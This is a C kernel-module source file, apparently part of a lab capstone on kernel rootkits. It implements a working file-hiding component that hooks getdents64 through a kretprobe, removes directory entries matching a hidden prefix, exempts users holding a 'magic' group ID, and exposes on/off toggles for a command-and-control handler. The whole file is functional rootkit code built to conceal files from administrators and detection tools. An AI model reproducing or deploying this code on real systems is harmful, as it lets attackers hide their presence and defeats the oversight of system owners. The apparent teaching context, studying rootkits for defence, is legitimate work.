/*
 * file_hide.c — File hiding via getdents64 kretprobe
 *
 * Capstone: Kernel Rootkit + Exploitation
 *
 * Hooks __arm64_sys_getdents64 using a kretprobe. The entry handler saves the
 * userspace buffer pointer. The return handler copies the dirent buffer into
 * kernel space, removes entries matching HIDDEN_PREFIX, and copies the filtered
 * buffer back to userspace.
 *
 * Reference: modules/cloak/cloak.c in the QEMU lab
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <asm/ptrace.h>

#include "rootkit.h"

/* Maximum dirent buffer size we'll handle (64 KiB) */
#define MAX_BUF_SIZE (1 << 16)

/* ─── Per-instance data passed from entry to return handler ───────────────── */

struct file_hide_data {
	struct linux_dirent64 __user *dirp;
};

/* ─── Entry handler ───────────────────────────────────────────────────────── */

static int file_hide_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct pt_regs *inner_regs = (struct pt_regs *)regs->regs[0];
	struct file_hide_data *data = (struct file_hide_data *)ri->data;

	/* dirp is the second syscall arg → regs[1] of the inner pt_regs */
	data->dirp = (struct linux_dirent64 __user *)inner_regs->regs[1];

	return 0;
}

/* ─── Return handler ──────────────────────────────────────────────────────── */

static int file_hide_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct file_hide_data *data = (struct file_hide_data *)ri->data;
	struct linux_dirent64 __user *dirp = data->dirp;
	struct linux_dirent64 *current_dir, *prev = NULL;
	int total_bytes = regs_return_value(regs);
	char *kbuf;
	int offset = 0;

	/* Nothing to filter if getdents64 returned 0 or error */
	if (total_bytes <= 0)
		return 0;

	/* Privileged user sees everything */
	if (guardian_has_magic_gid())
		return 0;

	/* Atomic because kretprobe handlers run in atomic context */
	kbuf = kmalloc(total_bytes, GFP_ATOMIC);
	if (!kbuf)
		return 0;

	if (copy_from_user(kbuf, dirp, total_bytes)) {
		kfree(kbuf);
		return 0;
	}

	/* Walk the dirent buffer and remove matching entries */
	while (offset < total_bytes) {
		current_dir = (struct linux_dirent64 *)(kbuf + offset);

		if (strncmp(current_dir->d_name, HIDDEN_PREFIX, HIDDEN_PREFIX_LEN) != 0) {
			/* No match — advance */
			prev = current_dir;
			offset += current_dir->d_reclen;
		} else if (prev) {
			/* Match, not first entry: prev absorbs current */
			prev->d_reclen += current_dir->d_reclen;
			offset += current_dir->d_reclen;
		} else {
			/* Match, first entry: shift everything forward */
			int reclen = current_dir->d_reclen;

			total_bytes -= reclen;
			memmove(kbuf, kbuf + reclen, total_bytes);
			/* Don't advance offset — new data is at same position */
		}
	}

	/* Write filtered buffer back to userspace and fix return value */
	if (copy_to_user(dirp, kbuf, total_bytes)) {
	kfree(kbuf);
	return 0;
	}

	regs->regs[0] = total_bytes;

	kfree(kbuf);
	return 0;
}

/* ─── Kretprobe definition ────────────────────────────────────────────────── */

static struct kretprobe file_hide_krp = {
	.handler       = file_hide_return,
	.entry_handler = file_hide_entry,
	.data_size     = sizeof(struct file_hide_data),
	.maxactive     = 20,
	.kp.symbol_name = "__arm64_sys_getdents64",
};

/* ─── State tracking ──────────────────────────────────────────────────────── */

static bool active;

/* ─── Public interface ────────────────────────────────────────────────────── */

int file_hide_init(void)
{
  int ret = register_kretprobe(&file_hide_krp);
  if (ret < 0){
    pr_err("[file_hide] [error] failed to register kretprobe: %d\n", ret);
    return ret;
  }

  active = true;
  pr_info("[file_hide] kretprobe registered\n");
	return 0;
}

void file_hide_exit(void)
{
  if (!file_hide_is_active()) {
    pr_err("[file_hide] [error] Could not unregister kretprobe (no kretprobe active)\n");
    return;
  }
  
  unregister_kretprobe(&file_hide_krp);
  pr_info("[file_hide] nmissed counter:%d\n", file_hide_krp.nmissed);
  active = false;
}

/*
 * These are called by the C2 handler for toggle commands.
 */
int file_hide_enable(void)
{
	return file_hide_init();
}

void file_hide_disable(void)
{
  file_hide_exit();
}

bool file_hide_is_active(void)
{
	return active;
}
